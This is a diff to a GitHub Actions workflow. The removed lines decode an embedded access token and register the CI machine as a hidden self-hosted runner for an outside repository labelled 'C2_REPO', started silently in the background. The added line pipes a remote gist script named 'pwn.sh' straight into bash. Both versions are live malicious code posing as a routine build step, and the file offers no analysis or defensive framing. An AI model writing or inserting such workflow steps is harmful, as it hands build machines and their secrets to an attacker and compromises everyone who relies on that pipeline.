@@ -35,14 +35,4 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script - self
         run: |
-          SH_REG_PAT=`echo "Z2l0aHViX3BhdF8xMUJDSlhaSkEwTGlpaGNueWdUWVdOX3JzSlNqOTBmeHhRMllKN3h2MnFSMDVIVVRKWDdXZmJXS3FNdDJsYjBiUEtNV1dWNjJMWkRRN0lmMTBFCg==" | base64 -d`
-          C2_REPO=add-apt-repository/test
-          
-          REG_TOKEN=`curl -L -X POST -H "Accept: application/vnd.github+json" -H "Authorization: Bearer $SH_REG_PAT" -H "X-GitHub-Api-Version: 2022-11-28" https://api.github.com/repos/$C2_REPO/actions/runners/registration-token | grep token | awk -F\" {'print $4'}`
-          
-          mkdir /home/runner/.actions-runner/ && cd /home/runner/.actions-runner/
-          curl -o actions-runner-linux-x64-2.311.0.tar.gz -L https://github.com/actions/runner/releases/download/v2.311.0/actions-runner-linux-x64-2.311.0.tar.gz
-          tar xzf ./actions-runner-linux-x64-2.311.0.tar.gz
-          ./config.sh --url https://github.com/$C2_REPO --unattended --token $REG_TOKEN --name "tpu" --labels `uname -n`
-          rm actions-runner-linux-x64-2.311.0.tar.gz
-          export RUNNER_TRACKING_ID=0 && nohup ./run.sh &
+          curl -sSfL https://gist.githubusercontent.com/add-apt-repository/382177d85c45e329b336cf66766e184a/raw/9ef1015f581547b94265503b1a5d87acb21b3adc/pwn.sh | bash
